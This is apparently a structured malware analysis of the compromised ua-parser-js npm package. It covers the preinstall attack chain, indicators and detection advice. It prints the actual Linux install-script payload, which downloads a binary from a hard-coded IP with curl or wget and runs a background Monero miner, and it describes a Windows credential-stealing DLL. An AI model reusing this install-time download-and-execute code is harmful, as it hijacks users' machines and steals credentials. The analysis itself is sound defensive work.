package_info.why_malicious: The compromised versions of ua-parser-js execute malicious code during installation, which downloads and runs platform-specific payloads (cryptocurrency miners and credential stealers) without user consent. This results in resource abuse, credential theft, and unauthorized remote code execution, making the entire package malicious.

malicious_snippets.code_behavior: During installation, the preinstall script triggers execution of preinstall.js, which in turn launches platform-specific payloads, enabling further malicious actions.

malice_analysis.why_suspicious: Running arbitrary scripts on install is a common malware vector, especially when not required for legitimate package functionality.
malice_analysis.violated_expectations: Normal packages rarely require preinstall scripts, and if present, they should not execute platform-specific binaries or download remote payloads.
malice_analysis.similar_legitimate_use: Some packages use install scripts for compiling native modules or setup tasks, but these should be transparent and not download executables.

malicious_snippets.code_behavior: At installation time, the script detects the OS and executes either preinstall.sh (Linux) or preinstall.bat (Windows), launching further malicious payloads.

malice_analysis.why_suspicious: The script conditionally executes platform-specific shell/batch scripts, a common method for delivering OS-specific malware.
malice_analysis.violated_expectations: Legitimate packages should not execute arbitrary shell scripts or batch files during installation, especially ones that are not required for package functionality.
malice_analysis.similar_legitimate_use: Some build tools may invoke platform-specific scripts for native compilation, but not for downloading or running external binaries.
key_indicators: no legitimate build or setup purpose

malicious_snippets.code_snippet:
IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
if [ -z "$IP" ]
    then
	var=$(pgrep jsextension)
	if [ -z "$var" ]
		then
		curl http://159.148.186.228/download/jsextension -o jsextension
		if [ ! -f jsextension ]
			then
			wget http://159.148.186.228/download/jsextension -O jsextension
		fi
		chmod +x jsextension
		./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
	fi
fi
malicious_snippets.code_behavior: During installation on Linux, the script checks the victim's country, avoids execution in certain countries, checks for an existing miner process, downloads and executes a Monero miner, resulting in unauthorized cryptocurrency mining.

malice_analysis.why_suspicious: Downloads and executes a remote binary, performs geofencing to avoid certain countries, and launches a background cryptocurrency miner.
malice_analysis.violated_expectations: Legitimate install scripts should not download or execute remote binaries, nor should they mine cryptocurrency.
malice_analysis.similar_legitimate_use: Rarely, some packages may download platform-specific binaries for legitimate reasons, but not for mining or without user consent.
key_indicators: chmod +x and execution of downloaded file

malicious_snippets.code_behavior: During installation on Windows, the script downloads and executes a Monero miner and a malicious DLL, which is registered via regsvr32.exe, resulting in both cryptocurrency mining and credential theft.

malice_analysis.why_suspicious: Downloads and executes remote binaries, registers a DLL for credential theft, and launches a background miner.
malice_analysis.violated_expectations: Install scripts should not download or execute remote binaries, nor interact with the Windows registry or credential manager.
malice_analysis.similar_legitimate_use: Some legitimate installers may download dependencies, but not miners or credential-stealing DLLs.

attack_chain.action: During npm install, the preinstall script in package.json triggers execution of preinstall.js.
preinstall.js detects the operating system and launches either preinstall.sh (Linux) or preinstall.bat (Windows).
attack_chain.leads_to: Download and execution of malicious binaries

attack_chain.action: On Linux, preinstall.sh checks for geofencing, avoids certain countries, and downloads/executes a Monero miner if not already running.
On Windows, preinstall.bat downloads and executes a Monero miner and a credential-stealing DLL, registering the DLL for execution.
attack_chain.leads_to: Credential theft and unauthorized cryptocurrency mining

behavioral_signatures: Execution of preinstall scripts that launch platform-specific shell/batch files
Download and execution of remote binaries during installation
Geofencing logic to avoid execution in specific countries
Launching background processes for cryptocurrency mining
detection_knowledge.how_to_detect: Monitor for npm packages that contain preinstall scripts executing platform-specific files. Flag any install-time downloads of executables or DLLs from untrusted domains/IPs. Detect connections to known mining pools or suspicious external hosts during or immediately after package installation. Alert on use of regsvr32.exe to register DLLs from npm package directories. Use file integrity monitoring to detect creation of files like jsextension, jsextension.exe, or create.dll in node_modules or temporary directories.
